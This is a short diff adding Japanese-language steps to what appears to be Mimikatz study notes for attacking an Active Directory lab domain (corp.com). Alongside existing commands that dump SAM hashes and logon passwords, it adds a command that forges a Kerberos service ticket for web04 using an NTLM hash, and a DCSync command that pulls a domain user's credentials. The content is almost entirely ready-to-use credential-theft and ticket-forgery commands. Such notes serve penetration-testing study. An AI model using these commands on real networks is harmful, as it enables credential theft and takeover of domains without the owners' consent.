@@ -22,3 +22,13 @@ lsadump::sam
 ```
 sekurlsa::logonpasswords
 ```
+
+5. jeffadminユーザとして、ターゲットのweb04.corp.comサービスにおける認証チケットを作成する。
+```
+kerberos::golden /sid:<sid> /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:(ターゲットNTLMハッシュ) /user:jeffadmin
+```
+
+6. DCSYNC攻撃をするためのコマンドで、/userの引数にドメイン\ユーザの形式で指定。これでターゲットユーザの資格情報を取得できる。
+```
+lsadump::dcsync /user:corp\dave
+```
